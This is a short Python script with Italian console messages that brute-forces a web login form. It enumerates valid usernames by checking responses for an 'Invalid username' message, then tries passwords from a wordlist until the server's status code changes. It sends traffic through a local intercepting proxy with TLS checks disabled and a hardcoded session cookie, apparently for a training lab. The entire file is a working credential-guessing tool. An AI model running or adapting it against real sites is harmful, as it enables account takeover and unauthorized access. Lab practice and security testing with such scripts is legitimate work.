import urllib3
import sys
import requests
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

username_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\usernames.txt"
password_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\passwords.txt"


def perform_request(url,username,password):
    uri = "/login"
    cookies = {'session' : 'MEVZWIcuvGRRSsMp17Wo9iIjT1wCVPuj'}
    data = {'username' : username , 'password' : password}
    r = requests.post(url + uri, data=data, allow_redirects=False, cookies=cookies, verify=False, proxies=proxies)
    if password == "blank":
        return r.text
    else:
        return r.status_code



def enumerate_username(url,usernames):
    with open(usernames,'r') as u:
        for x in u:
            username = x.split("\n")[0]
            sys.stdout.write("[+] Testando il nome utente %s\r" % username)
            sys.stdout.flush()
            response = perform_request(url, username, "blank")
            if "Invalid username" not in response:
                u.close()
                return username
            sys.stdout.write("\033[K")
        u.close()
            

def enumerate_password(url,username,passwords):
    with open(passwords, 'r') as p:
        for x in p:
            password = x.split("\n")[0]
            sys.stdout.write("[+] Testando la password %s\r" % password)
            sys.stdout.flush()
            response_code = perform_request(url, username, password)
            if response_code != 200:
                p.close()
                return password
            sys.stdout.write("\033[K")
        p.close()


if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    correct_username = enumerate_username(url,username_list)
    print("\n[+] Nome utente trovato!\n\r[+] È %s" % correct_username)

    correct_password = enumerate_password(url,correct_username,password_list)
    print("\n[+] La password è %s" % correct_password)

